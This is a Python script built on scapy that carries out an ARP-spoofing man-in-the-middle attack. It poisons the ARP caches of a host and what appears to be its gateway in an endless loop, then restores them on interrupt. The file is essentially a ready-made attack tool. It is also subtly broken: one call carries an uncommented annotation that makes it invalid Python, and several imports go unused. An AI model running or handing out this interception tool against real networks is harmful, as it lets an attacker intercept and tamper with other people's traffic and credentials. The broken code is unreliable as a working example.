import os
import sys
import platform
import urllib.request
import cv2
import scapy.all as scapy
from distutils.dir_util import copy_tree

def restore_defaults(dest, source):
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

def spoofing(target, spoofed):
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoofing("192.168.1.1", "192.168.1.130") (source, dest -> attacker machine)
            spoofing("192.168.1.130", "192.168.1.1")
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults("192.168.1.1", "192.168.1.130")
        restore_defaults("192.168.1.130", "192.168.1.1")
        exit(0)

if __name__ == "__main__":
    main()
